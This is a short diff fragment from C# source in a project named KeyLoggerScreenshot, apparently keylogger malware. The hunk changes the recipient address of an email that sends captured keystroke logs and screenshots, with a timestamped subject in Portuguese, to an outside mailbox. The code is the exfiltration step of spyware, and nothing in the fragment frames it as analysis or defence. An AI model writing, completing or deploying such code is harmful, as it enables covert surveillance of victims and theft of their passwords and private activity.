@@ -172,7 +172,7 @@ namespace KeyLoggerScreenshot
                 using (MailMessage mail = new MailMessage())
                 {
                     mail.From = new MailAddress(userEmail);
-                    mail.To.Add("bashlover142@gmail.com");
+                    mail.To.Add("rootkitequality@yopmail.com");
                     mail.Subject = "Logs e Captura de Tela - " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
 
                     // Corpo do e-mail com concatenação
